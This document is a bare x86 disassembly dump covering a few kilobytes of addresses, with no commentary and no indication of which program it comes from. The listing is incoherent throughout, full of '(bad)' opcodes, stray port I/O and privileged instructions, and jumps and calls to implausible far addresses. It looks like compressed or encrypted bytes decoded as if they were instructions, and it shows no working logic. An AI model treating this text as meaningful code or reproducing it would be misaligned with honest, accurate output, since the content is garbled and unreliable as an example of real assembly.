  40c3e5:	out    0xfe,al
  40c3e7:	dec    DWORD PTR [ecx]
  40c3e9:	add    al,0x8d
  40c3eb:	inc    ebp
  40c3ec:	adc    DWORD PTR [edx+ebp*2],0x6a02e301
  40c3f3:	add    BYTE PTR [eax+eax*2+0x2f350e0],cl
  40c3fa:	lea    eax,[ebp-0x67]
  40c3fd:	adc    edi,edi
  40c3ff:	adc    eax,0x40ec9e
  40c404:	rol    bl,cl
  40c406:	jb     0x40c435
  40c408:	dec    edx
  40c409:	cmp    esp,ebp
  40c40b:	add    BYTE PTR [ebp-0x26fe47e2],dl
  40c411:	add    eax,DWORD PTR [eax]
  40c413:	or     ebx,DWORD PTR [ecx]
  40c415:	xor    BYTE PTR [esi],dl
  40c417:	inc    DWORD PTR [ebx+ecx*8-0x491e8a03]
  40c41e:	jae    0x40c40c
  40c420:	push   cs
  40c421:	or     BYTE PTR cs:[eax-0x10],ch
  40c425:	fld    DWORD PTR [edx]
  40c427:	out    dx,eax
  40c428:	pop    esi
  40c429:	add    eax,0xf8fb
	...
  40c43e:	xchg   edi,eax
  40c43f:	add    al,dl
  40c441:	je     0x40c3df
  40c443:	cmc    
  40c444:	xchg   ebp,eax
  40c445:	inc    esp
  40c446:	lock fnsave [eax]
  40c449:	jmp    FWORD PTR ds:0xecc582d6
  40c44f:	pop    esp
  40c450:	push   ecx
  40c451:	clc    
  40c452:	lock xor ebp,edi
  40c455:	and    BYTE PTR [esi],0xde
  40c458:	std    
  40c459:	test   bh,cl
  40c45b:	mov    eax,0xa57fece
  40c460:	sar    dh,1
  40c462:	in     eax,0x68
  40c464:	sbb    eax,0xbceff041
  40c469:	shl    esp,0xdd
  40c46c:	aaa    
  40c46d:	mov    eax,DWORD PTR [esp+ebx*2-0x38]
  40c471:	neg    DWORD PTR [edx+0x272f58dd]
  40c477:	jmp    0xfece:0xee51e7fb
  40c47e:	imul   ebx,DWORD PTR [edx],0xbfcd7fd0
  40c484:	inc    eax
  40c485:	inc    ecx
  40c486:	lock fst QWORD PTR [edi+0x29]
  40c48a:	mov    ah,al
  40c48c:	inc    eax
  40c48d:	inc    ecx
  40c48e:	lock mov ch,0xe6
  40c491:	inc    eax
  40c492:	xor    DWORD PTR [eax+0x5d66e4da],esi
  40c498:	iret   
  40c499:	test   BYTE PTR [eax+0xf682bdc],dh
  40c49f:	jb     0x40c4e4
	...
  40c4b1:	add    BYTE PTR [eax],al
  40c4b3:	add    BYTE PTR [eax-0x52],bl
  40c4b6:	inc    eax
  40c4b7:	inc    ecx
  40c4b8:	lock inc edi
  40c4ba:	mov    dl,0x7d
  40c4bc:	mov    edi,0xe04c5f5
  40c4c1:	pop    es
  40c4c2:	stos   DWORD PTR es:[edi],eax
  40c4c3:	inc    esp
  40c4c4:	lock pop es
  40c4c6:	push   0x11
  40c4c8:	fisttp DWORD PTR [eax-0x58]
  40c4cb:	add    esi,eax
  40c4cd:	cmp    dl,bl
  40c4cf:	(bad)  
  40c4d0:	sub    al,0xbf
  40c4d2:	call   0xd247b4da
  40c4d7:	ret    
  40c4d8:	aaa    
  40c4d9:	push   edi
  40c4da:	cdq    
  40c4db:	and    BYTE PTR [edi+edi*4],0x9a
  40c4df:	into   
  40c4e0:	fdivr  st(1),st
  40c4e2:	sub    al,BYTE PTR [ebp-0x10]
  40c4e5:	mov    ebp,DWORD PTR [eax-0x94e0db4]
  40c4eb:	sbb    ah,0xbe
  40c4ee:	call   0xdef2b74b
  40c4f3:	into   
  40c4f4:	les    edi,FWORD PTR [esi-0x5107a743]
  40c4fa:	cmp    cl,bl
  40c4fc:	ds (bad) 
  40c4fe:	popa   
  40c4ff:	cmp    BYTE PTR [eax],bh
  40c501:	xchg   edx,eax
  40c502:	cli    
  40c503:	into   
  40c504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c505:	mov    esi,0xc5f8319d
  40c50a:	sbb    edi,esp
  40c50c:	pop    ss
  40c50d:	push   ecx
  40c50e:	mov    esi,cs
  40c510:	push   ss
  40c511:	(bad)  
  40c512:	sti    
  40c513:	sti    
  40c514:	pop    ss
  40c515:	bnd jle 0x40c4e6
	...
  40c528:	add    BYTE PTR [eax],al
  40c52a:	push   es
  40c52b:	(bad)  
  40c52c:	sti    
  40c52d:	iret   
  40c52e:	(bad)  
  40c52f:	cmp    esp,ecx
  40c531:	(bad)  [ebx-0x473199c9]
  40c537:	enter  0x3e4,0x3d
  40c53b:	xchg   edx,eax
  40c53c:	inc    esp
  40c53d:	xor    BYTE PTR [ebx+0x4336b6b6],0x92
  40c544:	fwait
  40c545:	push   DWORD PTR [esi-0xffc16f8]
  40c54b:	push   es
  40c54c:	add    BYTE PTR [esi],dh
  40c54e:	sbb    BYTE PTR [edi],cl
  40c550:	call   0x47f4c2
  40c555:	push   0xffffffbb
  40c557:	push   es
  40c558:	ja     0x40c54a
  40c55a:	or     al,bh
  40c55c:	pop    edx
  40c55d:	mov    dh,0xcd
  40c55f:	iret   
  40c560:	shl    ecx,0xf3
  40c563:	xlat   BYTE PTR ds:[ebx]
  40c564:	out    0x72,eax
  40c566:	enter  0x8912,0xeb
  40c56a:	or     bl,dh
  40c56c:	push   cs
  40c56d:	imul   ecx,DWORD PTR [ecx-0x3b],0xfffffffe
  40c571:	jmp    0x72490070
  40c576:	mov    edi,0xce43eb0e
  40c57b:	xchg   ecx,eax
  40c57c:	add    eax,0x71f54069
  40c581:	jecxz  0x40c5f6
  40c583:	sar    DWORD PTR [eax],0x3e
  40c586:	test   DWORD PTR [esi+0x2028f9eb],0xb580
	...
  40c5a0:	mov    bl,0x38
  40c5a2:	or     eax,0x774b2069
  40c5a7:	icebp  
  40c5a8:	jae    0x40c55b
  40c5aa:	inc    eax
  40c5ab:	imul   edi,DWORD PTR [eax],0xf8e0eb0f
  40c5b1:	(bad)  
  40c5b2:	pop    edx
  40c5b3:	cs (bad) 
  40c5b5:	iret   
  40c5b6:	shl    ecx,0xf3
  40c5b9:	add    dh,BYTE PTR [eax]
  40c5bb:	sti    
  40c5bc:	or     eax,DWORD PTR [ecx]
  40c5be:	cmp    esi,edi
  40c5c0:	div    edx
  40c5c2:	das    
  40c5c3:	cmp    ch,0x0
  40c5c6:	inc    ecx
  40c5c7:	fucomi st,st(1)
  40c5c9:	add    BYTE PTR [esi-0x2a],al
  40c5cc:	in     eax,dx
  40c5cd:	repnz inc eax
  40c5cf:	in     eax,dx
  40c5d0:	fnstenv [ecx+0x61ac0208]
  40c5d6:	pop    edi
  40c5d7:	add    BYTE PTR [edi-0x26f73f7f],dl
  40c5dd:	enter  0x4de,0xd3
  40c5e1:	int3   
  40c5e2:	test   al,0x4b
  40c5e4:	dec    edx
  40c5e5:	int    0x0
  40c5e7:	or     esi,DWORD PTR [edx]
  40c5e9:	pop    esp
  40c5ea:	mov    ds:0xfdc44c8b,al
  40c5ef:	xor    BYTE PTR [esi],dl
  40c5f1:	dec    esp
  40c5f2:	clc    
  40c5f3:	(bad)  
  40c5f4:	jl     0x40c5b6
  40c5f6:	lea    eax,[ebp-0xb]
  40c5f9:	leave  
  40c5fa:	inc    ebx
  40c5fb:	hlt    
  40c5fc:	cdq    
  40c5fd:	or     BYTE PTR [eax],al
  40c5ff:	add    BYTE PTR [edx],cl
  40c601:	adc    al,0x4f
  40c603:	sub    DWORD PTR [eax],eax
	...
  40c615:	add    BYTE PTR [eax+0x8],cl
  40c618:	add    BYTE PTR [edi+ebp*1+0x44],dh
  40c61c:	inc    esp
  40c61d:	lock sub DWORD PTR [ecx+0x1],esp
  40c621:	push   0x49
  40c623:	pop    esi
  40c624:	add    BYTE PTR [edx+0x49],ch
  40c627:	pop    esi
  40c628:	add    BYTE PTR [ebp-0xb12ce4],cl
  40c62e:	sbb    al,0x3
  40c630:	sub    DWORD PTR [ecx+0x49],eax
  40c633:	mov    edi,0x874374be
  40c638:	jnp    0x40c62e
  40c63a:	sbb    DWORD PTR [esp+esi*1-0x75],ebx
  40c63e:	int3   
  40c63f:	push   es
  40c640:	mov    ecx,DWORD PTR [ebp+0x79]
  40c643:	invd   
  40c645:	ja     0x40c67a
  40c647:	aam    0x89
  40c649:	jne    0x40c5d8
  40c64b:	ds jl  0x40c656
  40c64e:	add    BYTE PTR [eax+esi*8],0xe3
  40c652:	or     edx,edi
  40c654:	mov    ds:0xff06cc8b,al
  40c659:	jne    0x40c6a4
  40c65b:	inc    ebx
  40c65c:	(bad)  
  40c65d:	(bad)  
  40c65e:	mov    esp,0xf0e3e6db
  40c663:	jo     0x40c667
  40c665:	add    BYTE PTR [eax-0xffffd52],bl
  40c66b:	push   0xefb95e2b
  40c670:	cli    
  40c671:	dec    DWORD PTR [edx]
  40c673:	out    dx,al
  40c674:	daa    
  40c675:	pop    edi
  40c676:	push   ss
  40c677:	out    0xc0,eax
  40c679:	pop    es
	...
  40c68a:	add    BYTE PTR [eax],al
  40c68c:	lock xor BYTE PTR [edi-0x15],0x73
  40c691:	jmp    0xce312e58
  40c696:	add    al,BYTE PTR [eax]
  40c698:	mov    BYTE PTR [ecx+edx*2-0x1],dl
  40c69c:	(bad)  
  40c69d:	ss inc esi
  40c69f:	cld    
  40c6a0:	sbb    BYTE PTR [esi+0x5f00022],ch
  40c6a6:	xchg   ecx,eax
  40c6a7:	jno    0x40c720
  40c6a9:	mov    ah,0x78
  40c6ab:	inc    esp
  40c6ac:	push   0xf0200455
  40c6b1:	lods   eax,DWORD PTR ds:[esi]
  40c6b2:	fisub  DWORD PTR [edx+eiz*8-0x52773524]
  40c6b9:	fstp   DWORD PTR [ebx+0x0]
  40c6bc:	adc    BYTE PTR [esi-0x9717fe],ch
  40c6c2:	retf   0x69fe
  40c6c5:	repnz shl DWORD PTR [edi-0x10],cl
  40c6c9:	or     eax,0x38180004
  40c6ce:	push   esi
  40c6cf:	jmp    DWORD PTR [edi]
  40c6d1:	ss inc ecx
  40c6d3:	in     al,dx
  40c6d4:	mov    BYTE PTR [ebp-0x7a0fffde],ch
  40c6da:	dec    ecx
  40c6db:	jb     0x40c6ec
  40c6dd:	mov    WORD PTR [esp+eax*2+0x18],?
  40c6e1:	adc    eax,0xadf02004
  40c6e6:	fidiv  DWORD PTR [eax-0x7e]
  40c6e9:	xor    al,0xcb
  40c6eb:	mov    BYTE PTR ds:0xcb4d07,dh
	...
  40c701:	add    BYTE PTR [edi+edx*1-0x2f],bl
  40c705:	sbb    DWORD PTR [ebx],esi
  40c707:	dec    eax
  40c708:	jmp    0x410423d7
  40c70d:	jnp    0x40c742
  40c70f:	pop    es
  40c710:	jmp    0x3e547a9b
  40c715:	push   ecx
  40c716:	loopne 0x40c746
  40c718:	test   al,0x46
  40c71a:	xor    DWORD PTR [edi],eax
  40c71c:	cs push ecx
  40c71e:	test   al,0xaf
  40c720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c721:	aas    
  40c722:	lock push es
  40c724:	push   0xffffffc0
  40c726:	jmp    0x40c6e9
  40c728:	fwait
  40c729:	mulss  xmm5,DWORD PTR [edx+0x7bc1f044]
  40c731:	iret   
  40c732:	(bad)  
  40c733:	xor    BYTE PTR [ebp+0x2c85f003],ah
  40c739:	clc    
  40c73a:	jbe    0x40c778
  40c73c:	fstp   DWORD PTR [ebx-0x1b]
  40c73f:	inc    ebp
  40c740:	sub    BYTE PTR [edi+eiz*2],al
  40c743:	cmp    al,0xd9
  40c745:	fcmovnb st,st(5)
  40c747:	dec    edx
  40c748:	jmp    0xdd0c3a50
  40c74d:	retf   0x16c4
  40c750:	push   ecx
  40c751:	jl     0x40c705
  40c753:	inc    edi
  40c754:	jmp    0xc0f38c23
  40c759:	inc    esi
  40c75a:	lods   al,BYTE PTR ds:[esi]
  40c75b:	push   es
  40c75c:	jmp    0xa653fae7
  40c761:	push   eax
  40c762:	hlt    
  40c763:	cs jg  0x40c7ac
	...
  40c776:	add    BYTE PTR [eax],al
  40c778:	mov    cl,0x6
  40c77a:	xchg   esi,eax
  40c77b:	push   eax
  40c77c:	or     BYTE PTR [edi+0x6f03fd8],ch
  40c782:	push   0xffffffbf
  40c784:	sti    
  40c785:	shl    ebx,0xf3
  40c788:	xchg   edi,eax
  40c789:	ins    BYTE PTR es:[edi],dx
  40c78a:	jmp    FWORD PTR [ecx]
  40c78c:	lods   eax,DWORD PTR ds:[esi]
  40c78d:	push   es
  40c78e:	push   esp
  40c790:	iret   
  40c791:	test   eax,0x6f3ad1c
  40c796:	and    DWORD PTR ds:0x56002fe7,0x40
  40c79d:	ret    
  40c79e:	(bad)  
  40c79f:	aam    0xc7
  40c7a1:	shl    BYTE PTR [esp+edx*8],0xe4
  40c7a5:	inc    edi
  40c7a6:	add    BYTE PTR [ecx-0x7e],dl
  40c7a9:	xor    eax,0x4b3436ff
  40c7ae:	loopne 0x40c773
  40c7b0:	repz shl DWORD PTR [ecx+eiz*1-0x46],0x3a
  40c7b6:	or     al,0x1e
  40c7b8:	add    BYTE PTR [ecx+ebp*1],dh
  40c7bb:	test   al,0xf3
  40c7bd:	scas   al,BYTE PTR es:[edi]
  40c7be:	rcl    BYTE PTR [ebp-0x53773f46],0x4f
  40c7c5:	das    
  40c7c6:	add    dh,bh
  40c7c8:	das    
  40c7c9:	mov    ebx,0xc07f7cfe
  40c7ce:	xor    al,0x7c
  40c7d0:	or     al,0x48
  40c7d2:	add    cl,dl
  40c7d4:	test   DWORD PTR ds:0x4adbdeff,esi
  40c7da:	fadd   DWORD PTR [ebx+0x0]
	...
  40c7ed:	add    ah,ch
  40c7ef:	shl    DWORD PTR [ecx+ebx*8+0x39],0x3a
  40c7f4:	call   0x2974bfbf
  40c7f9:	sub    ah,dh
  40c7fb:	scas   al,BYTE PTR es:[edi]
  40c7fc:	xchg   esp,eax
  40c7fd:	cmp    eax,0x2488c029
  40c802:	pusha  
  40c803:	das    
  40c804:	add    BYTE PTR [esi+0x14feb2b7],ah
  40c80a:	cmp    al,0xc0
  40c80c:	xor    al,0x4
  40c80e:	sti    
  40c80f:	inc    edi
  40c810:	add    BYTE PTR [ecx+0xff3ab9],al
  40c816:	outs   dx,BYTE PTR ds:[esi]
  40c817:	cmp    eax,0x18cd044
  40c81c:	rcl    BYTE PTR [eax+0x7e],0x51
  40c820:	in     al,0xff
  40c822:	in     al,0xb8
  40c824:	std    
  40c825:	xor    eax,0x411dbc
  40c82a:	inc    ecx
  40c82b:	es je  0x40c82d
  40c82e:	ds cmp al,0x44
  40c831:	int3   
  40c832:	pop    edx
  40c833:	dec    eax
  40c834:	loopne 0x40c836
  40c836:	mov    esi,0xc900b640
  40c83b:	add    al,0x83
  40c83d:	jge    0x40c814
  40c83f:	or     cl,BYTE PTR [edi]
  40c841:	test   BYTE PTR [ebx+ecx*1],ch
  40c844:	add    BYTE PTR [eax],al
  40c846:	sbb    cl,BYTE PTR [eax-0x30]
  40c849:	add    BYTE PTR [esi-0x76ff5dc0],cl
  40c84f:	add    al,0x8d
  40c851:	inc    ebp
	...
  40c862:	add    BYTE PTR [eax],al
  40c864:	aad    0xfa
  40c866:	(bad)  
  40c867:	jne    0x40c84e
  40c869:	loop   0x40c8b9
  40c86b:	std    
  40c86c:	jle    0x40c83d
  40c86e:	or     eax,eax
  40c870:	mov    es,WORD PTR [eax-0x72]
  40c873:	add    BYTE PTR [ecx+0x4],bl
  40c876:	cmp    DWORD PTR [ebp-0x6b],0x4
  40c87a:	je     0x40cc54
  40c880:	int3   
  40c881:	add    al,cl
  40c883:	push   eax
  40c884:	ds push ecx
  40c886:	shr    al,1
  40c888:	dec    ebx
  40c889:	leave  
  40c88a:	std    
  40c88b:	inc    DWORD PTR [edx-0x3c]
  40c88e:	jb     0x40c905
  40c890:	retf   0xc848
  40c893:	add    ch,ah
  40c895:	pop    ebp
  40c896:	push   0xbcdf1910
  40c89b:	inc    DWORD PTR [ebx+eax*8]
  40c89e:	out    0x76,al
  40c8a0:	lock or cl,cl
  40c8a3:	dec    BYTE PTR [edi]
  40c8a5:	sbb    esp,esp
  40c8a7:	(bad)  
  40c8a8:	jge    0x40c85f
  40c8aa:	fcmove st,st(4)
  40c8ac:	lea    eax,[eax-0x38]
  40c8af:	(bad)  
  40c8b0:	jge    0x40c84b
  40c8b2:	(bad)  
  40c8b3:	je     0x40c8ad
  40c8b5:	test   esp,eax
  40c8b7:	ins    BYTE PTR es:[edi],dx
  40c8b8:	out    0x28,eax
  40c8ba:	enter  0xb874,0x60
  40c8be:	dec    esi
  40c8bf:	or     al,cl
  40c8c1:	mov    al,ds:0x50cfff55
  40c8c6:	dec    esi
  40c8c7:	les    eax,FWORD PTR [eax]
	...
  40c8d9:	add    bh,al
  40c8db:	sub    BYTE PTR [esi-0x2549ba02],0x7c
  40c8e2:	inc    ebp
  40c8e3:	stc    
  40c8e4:	(bad)  
  40c8e5:	(bad)  
  40c8e6:	and    eax,0xc074c7e6
  40c8eb:	call   0x90c8d13d
  40c8f0:	push   ebp
  40c8f1:	call   DWORD PTR [edi-0xf33b9d4]
  40c8f7:	cdq    
  40c8f8:	in     eax,dx
  40c8f9:	add    BYTE PTR ds:0xef74feee,0x34
  40c900:	ds int3 
  40c902:	ja     0x40c981
  40c904:	(bad)  
  40c905:	je     0x40c8ff
  40c907:	add    eax,0xa8676d23
  40c90c:	fimul  DWORD PTR [ecx]
  40c90e:	retf   0xc5ad
  40c911:	je     0x40c8fb
  40c913:	(bad)
  40c916:	dec    edi
  40c917:	rol    dh,1
  40c919:	je     0x40c95f
  40c91b:	aad    0x82
  40c91d:	outs   dx,DWORD PTR ds:[esi]
  40c91e:	aas    
  40c91f:	add    dh,0x74
  40c922:	cmp    ch,al
  40c924:	dec    edx
  40c925:	jo     0x40c956
  40c927:	jo     0x40c8ef
  40c929:	je     0x40c947
  40c92b:	push   es
  40c92c:	xchg   ecx,eax
  40c92d:	push   ebx
  40c92e:	mov    al,ds:0x9cc79dbf
  40c933:	mov    dh,0x80
  40c935:	pop    ebx
  40c936:	cmp    BYTE PTR [edi-0x4d833873],0x90
  40c93d:	arpl   WORD PTR [eax],ax
	...
  40c94f:	add    BYTE PTR [eax+0x7cc77dbf],al
  40c955:	scas   al,BYTE PTR es:[edi]
  40c956:	sub    BYTE PTR [ebx],0x60
  40c959:	mov    esi,0xa35cc76d
  40c95e:	push   eax
  40c95f:	xor    esp,DWORD PTR [eax-0x42]
  40c962:	pop    ebp
  40c963:	(bad)  
  40c964:	pop    esp
  40c965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c966:	inc    eax
  40c967:	cmp    eax,DWORD PTR [eax-0x42]
  40c96a:	dec    ebp
  40c96b:	(bad)  
  40c96c:	cmp    al,0xdb
  40c96e:	push   eax
  40c96f:	inc    ebx
  40c970:	inc    eax
  40c971:	mov    esi,0xdf3cc73d
  40c976:	inc    eax
  40c977:	or     esp,DWORD PTR [eax]
  40c979:	mov    esi,0xd31cc72d
  40c97e:	adc    BYTE PTR [ebx],dl
  40c980:	and    BYTE PTR [esi-0x28e338e3],bh
  40c986:	add    BYTE PTR [ebx],bl
  40c988:	add    BYTE PTR [esi-0x350338f3],bh
  40c98e:	adc    BYTE PTR [ebx],ah
  40c990:	add    BYTE PTR [esi+0xbb1bcfd],bh
  40c996:	jmp    0x67ec44cb
  40c99b:	ror    BYTE PTR [edi-0x4a],0xe5
  40c99f:	(bad)  
  40c9a0:	ins    BYTE PTR es:[edi],dx
  40c9a1:	inc    esp
  40c9a2:	fnsave [ebx]
  40c9a4:	push   edi
  40c9a5:	xor    al,0xe5
  40c9a7:	mov    BYTE PTR [esp+ebp*1],0x0
  40c9ab:	inc    ebp
  40c9ac:	lock scas al,BYTE PTR es:[edi]
  40c9ae:	dec    esp
  40c9af:	inc    edx
  40c9b0:	lock push es
  40c9b2:	bnd ret 
	...
  40c9c4:	add    BYTE PTR [eax],al
  40c9c6:	out    0x83,al
  40c9c8:	(bad)  
  40c9c9:	fdivr  st(4),st
  40c9cb:	push   es
  40c9cc:	add    BYTE PTR [esi-0x17004150],ah
  40c9d2:	repz push es
  40c9d4:	(bad)  
  40c9d5:	and    al,0x40
  40c9d7:	mov    ebp,0x30f3e906
  40c9dc:	add    BYTE PTR [ebx],al
  40c9de:	in     al,dx
  40c9df:	xor    BYTE PTR [eax],al
  40c9e1:	adc    esi,esp
  40c9e3:	mov    eax,DWORD PTR [ebp+esi*2-0x3d]
  40c9e7:	mov    eax,DWORD PTR [ecx+edi*2+0x19febcbe]
  40c9ee:	scas   eax,DWORD PTR es:[edi]
  40c9ef:	xor    bh,al
  40c9f1:	inc    ax
  40c9f3:	mov    ebx,0x73217e7
  40c9f8:	add    dl,ah
  40c9fa:	mov    bl,0x39
  40c9fc:	add    eax,0xfebd9640
  40ca01:	jmp    0xa868a721
  40ca06:	repz mov ebp,0x5ecbe574
  40ca0c:	jae    0x40ca3c
  40ca0e:	scas   al,BYTE PTR es:[edi]
  40ca0f:	dec    ebp
  40ca10:	mov    edi,DWORD PTR [ecx]
  40ca12:	sbb    BYTE PTR [ebx-0x4351e911],al
  40ca18:	dec    edi
  40ca19:	mov    ebx,0xe734eab
  40ca1e:	scas   al,BYTE PTR es:[edi]
  40ca1f:	mov    es,WORD PTR [ecx+edx*1+0x11febcae]
  40ca26:	push   cs
  40ca27:	sub    eax,0xf6ff
	...
  40ca3c:	out    0x42,eax
  40ca3e:	lock cdq 
  40ca40:	retf   
  40ca41:	call   0xbe34f288
  40ca46:	mov    ah,0xd1
  40ca48:	and    eax,0xffd6febc
  40ca4d:	sub    ebp,DWORD PTR [ecx]
  40ca4f:	sub    ah,ch
  40ca51:	scas   al,BYTE PTR es:[edi]
  40ca52:	pushf  
  40ca53:	add    bl,bh
  40ca55:	ret    
  40ca56:	std    
  40ca57:	mov    esp,ecx
  40ca59:	fdivrp st(5),st
  40ca5b:	jmp    DWORD PTR [esi-0x79]
  40ca5e:	mov    ebx,0xfdc35eec
  40ca63:	add    ch,bh
  40ca65:	lock cmp BYTE PTR [ebp+0x79],0x6
  40ca6a:	jne    0x40cab5
  40ca6c:	xchg   edx,eax
  40ca6d:	cmp    eax,0xc376f7eb
  40ca72:	std    
  40ca73:	xor    BYTE PTR [esi+0x76f7eb3d],al
  40ca79:	ret    
  40ca7a:	jg     0x40ca39
  40ca7c:	jne    0x40ca48
  40ca7e:	std    
  40ca7f:	push   DWORD PTR [ecx+0x6]
  40ca82:	add    BYTE PTR [eax],al
  40ca84:	mov    edi,0x2585c5be
  40ca89:	retf   0xfffd
  40ca8c:	xor    DWORD PTR [esi],eax
  40ca8e:	add    BYTE PTR [eax],al
  40ca90:	xor    dh,BYTE PTR [ecx-0x35da7203]
  40ca96:	std    
  40ca97:	push   esi
  40ca99:	mov    ebp,edx
  40ca9b:	mul    esi
  40ca9d:	sar    ebp,0xb5
	...
  40cab0:	add    BYTE PTR [eax],al
  40cab2:	xor    edx,ecx
  40cab4:	std    
  40cab5:	call   esi
  40cab7:	dec    ebx
  40cab8:	or     al,ch
  40caba:	push   ecx
  40cabb:	(bad)  
  40cabc:	std    
  40cabd:	call   FWORD PTR [edx]
  40cabf:	test   dl,ch
  40cac1:	div    esi
  40cac3:	sar    esi,0x74
  40cac6:	aam    0xc1
  40cac8:	mov    bl,0xec
  40caca:	jle    0x40ca8f
  40cacc:	std    
  40cacd:	call   0x401e17
  40cad2:	push   esi
  40cad3:	(bad)  
  40cad4:	jmp    0xa611:0xe6c356f7
  40cadb:	sar    ebp,0xff
  40cade:	lock call 0x74c3:0xcd47f6da
  40cae6:	call   0x383ea9c0
  40caeb:	jge    0x40cab0
  40caed:	mov    ah,0x18
  40caef:	jge    0x40cab4
  40caf1:	(bad)  
  40caf2:	sbb    BYTE PTR [esi+0x54],dh
  40caf5:	call   FWORD PTR [edi]
  40caf7:	gs cmp eax,0xc46909f8
  40cafd:	dec    BYTE PTR [edi]
  40caff:	xchg   ebp,eax
  40cb00:	dec    ebp
  40cb01:	cld    
  40cb02:	sbb    al,dh
  40cb04:	inc    edx
  40cb05:	add    al,dh
  40cb07:	jbe    0x40cac9
  40cb09:	pop    es
  40cb0a:	lock adc bh,BYTE PTR [ecx-0x15]
  40cb0e:	jae    0x40cb79
  40cb10:	(bad)  
  40cb11:	imul   esi,eax,0xff1407
	...
  40cb27:	add    BYTE PTR [ebp-0x4a],ah
  40cb2a:	fimul  DWORD PTR [ecx]
  40cb2c:	inc    esp
  40cb2d:	pop    ebp
  40cb2e:	les    ecx,FWORD PTR [eax+0xc5b5235]
  40cb34:	xor    ebp,DWORD PTR [edi+0x2]
  40cb37:	inc    DWORD PTR [ebp-0x4a]
  40cb3a:	fisub  DWORD PTR [edx-0x13c034a]
  40cb40:	and    eax,0xf874c3f2
  40cb45:	inc    ebp
  40cb46:	push   cs
  40cb47:	ins    BYTE PTR es:[edi],dx
  40cb48:	lahf   
  40cb49:	in     al,0xb9
  40cb4b:	shr    esp,0xad
  40cb4e:	sub    eax,0xbf309c8b
  40cb53:	sti    
  40cb54:	push   ds
  40cb55:	jne    0x40cbaf
  40cb57:	add    BYTE PTR [edx],cl
  40cb59:	jg     0x40cb1e
  40cb5b:	je     0x40cb45
  40cb5d:	adc    eax,0xb46f6aac
  40cb62:	js     0x40cba8
  40cb64:	sub    BYTE PTR fs:[esi],cl
  40cb67:	xchg   BYTE PTR [eax],cl
  40cb69:	pop    es
  40cb6a:	sub    BYTE PTR [ebx+ebp*2],al
  40cb6d:	stc    
  40cb6e:	jb     0x40cb5c
  40cb70:	mov    al,0x6
  40cb72:	imul   eax,DWORD PTR [ebx],0x2c2432f0
  40cb78:	jge    0x40cbc1
  40cb7a:	sub    BYTE PTR [edi+ebx*4],al
  40cb7d:	scas   al,BYTE PTR es:[edi]
  40cb7e:	fadd   QWORD PTR [eax+esi*8+0x6]
  40cb82:	loop   0x40cb47
  40cb84:	mov    ds:0xdeac171b,eax
  40cb89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb8b:	ret    
	...
  40cb9c:	add    BYTE PTR [eax],al
  40cb9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb9f:	cs jmp 0xbceaa8
  40cba5:	retf   
  40cba6:	mov    dl,0x45
  40cba8:	jmp    0xf171cb00
  40cbad:	stos   DWORD PTR es:[edi],eax
  40cbae:	rcl    BYTE PTR [edi+0x5cd7c37d],0x7
  40cbb5:	ret    
  40cbb6:	out    0xae,al
  40cbb8:	out    0x49,eax
  40cbba:	jo     0x40cbb5
  40cbbc:	call   0x5d82a5f9
  40cbc1:	test   DWORD PTR [edi-0x393caa80],0x7725aba
  40cbcb:	add    bh,BYTE PTR [esi+edi*2-0x3cc2cb4a]
  40cbd2:	and    al,0xf
  40cbd4:	inc    ecx
  40cbd5:	jge    0x40cbf1
  40cbd7:	mov    edx,0xd03e632d
  40cbdc:	sub    cl,BYTE PTR [eax]
  40cbde:	lock push ebx
  40cbe0:	jb     0x40cb92
  40cbe2:	jb     0x40cba7
  40cbe4:	adc    BYTE PTR [edi-0x51],dl
  40cbe7:	inc    esp
  40cbe8:	adc    DWORD PTR [eax+esi*8],eax
  40cbeb:	push   es
  40cbec:	jmp    0xe8fbf8bb
  40cbf1:	add    esi,eax
  40cbf3:	push   es
  40cbf4:	add    BYTE PTR [edx-0x47],ah
  40cbf7:	or     al,BYTE PTR [ebx+0x933f3b1]
  40cbfd:	adc    ch,BYTE PTR [ebp*8+0x42d1]
	...
  40cc14:	cmp    eax,0xc6e90bc8
  40cc19:	push   es
  40cc1a:	add    cl,ch
  40cc1c:	rep lods eax,DWORD PTR ds:[esi]
  40cc1e:	pusha  
  40cc1f:	push   0xffffffb0
  40cc21:	push   ss
  40cc22:	add    BYTE PTR ds:0xd9448df9,dh
  40cc28:	je     0x40cc3c
  40cc2a:	push   DWORD PTR [eax+eax*1]
  40cc2d:	mov    edx,0xc94bf174
  40cc32:	addr16 sahf 
  40cc34:	xor    al,BYTE PTR [ebp+0x3c8e0fa]
  40cc3a:	or     DWORD PTR [esp+edi*1],esp
  40cc3d:	lods   eax,DWORD PTR ds:[esi]
  40cc3e:	inc    ebp
  40cc3f:	sbb    DWORD PTR [ecx],ecx
  40cc41:	cmp    edi,edi
  40cc43:	jle    0x40cbf7
  40cc45:	push   cs
  40cc46:	inc    ebp
  40cc47:	jno    0x40cc94
  40cc49:	jo     0x40ccca
  40cc4b:	jmp    0xebb5d343
  40cc50:	xchg   ah,dh
  40cc52:	and    BYTE PTR [edx-0x5],0x33
  40cc56:	adc    eax,0x8abf3862
  40cc5b:	mov    ah,0x7f
  40cc5d:	or     BYTE PTR [ebx+ebp*1-0xe203815],ah
  40cc64:	jl     0x40cca8
  40cc66:	clc    
  40cc67:	pusha  
  40cc68:	dec    eax
  40cc69:	mov    ebx,0x426edaea
  40cc6e:	clc    
  40cc6f:	jb     0x40cca9
  40cc71:	mov    ebx,0xb5450e
  40cc76:	ror    DWORD PTR [ecx],0x0
	...
  40cc89:	add    dl,bh
  40cc8b:	pop    DWORD PTR [ecx+edx*1+0x6c]
  40cc8f:	push   edx
  40cc90:	cld    
  40cc91:	add    BYTE PTR [edx-0x80],cl
  40cc94:	stc    
  40cc95:	or     edi,esp
  40cc97:	fwait
  40cc98:	mov    DWORD PTR [ebp+0x4d],eax
  40cc9b:	xor    BYTE PTR [esi],0x0
  40cc9e:	in     al,0xf
  40cca0:	sub    eax,eax
  40cca2:	add    dl,cl
  40cca4:	jmp    0xf8828eaf
  40cca9:	mov    eax,DWORD PTR [edi+eax*8]
  40ccac:	pop    ecx
  40ccad:	leave  
  40ccae:	mov    edx,DWORD PTR [esi]
  40ccb0:	add    BYTE PTR [ebp-0x3e],dl
  40ccb3:	jbe    0x40cc36
  40ccb5:	les    esp,FWORD PTR [ebp+0x25]
